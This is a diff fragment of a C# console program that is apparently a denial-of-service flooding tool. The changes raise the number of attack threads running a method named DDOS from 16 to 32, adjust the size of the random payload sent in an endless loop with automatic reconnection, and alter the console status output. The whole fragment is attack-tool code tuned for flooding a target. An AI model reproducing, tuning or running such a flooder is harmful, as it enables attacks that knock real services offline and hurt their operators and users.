@@ -42,7 +42,7 @@ class Program
                 Console.ResetColor();
             }
         }
-        for (int i = 0; i < 16; i++)
+        for (int i = 0; i < 32; i++)
         {
             Thread t = new Thread(DDOS);
             t.Start();
@@ -63,7 +63,7 @@ class Program
             Console.WriteLine("错误: ERROR:\u0020" + e);
             Console.ResetColor();
         }
-        string randomString = GenerateRandomString(20480);
+        string randomString = GenerateRandomString(2048);
         byte[] data = Encoding.UTF8.GetBytes(randomString);
         while (true)
         {
@@ -75,13 +75,13 @@ class Program
                 Console.ForegroundColor = ConsoleColor.Green;
                 Console.Write("OK");
                 Console.ResetColor();
-                Console.WriteLine("\u0020time =\u0020" + Program.count);
+                Console.Write("\u0020time =\u0020" + Program.count);
             }
             catch (Exception e)
             {
                 Console.Clear();
                 Console.ForegroundColor = ConsoleColor.Red;
-                Console.WriteLine("错误: ERROR At\u0020" + Program.count + "\u0020turns. Message:\u0020" + e.Message);
+                Console.Write("错误: ERROR At\u0020" + Program.count + "\u0020turns. Message:\u0020" + e.Message);
                 Console.ResetColor();
                 goto reclient;
             }
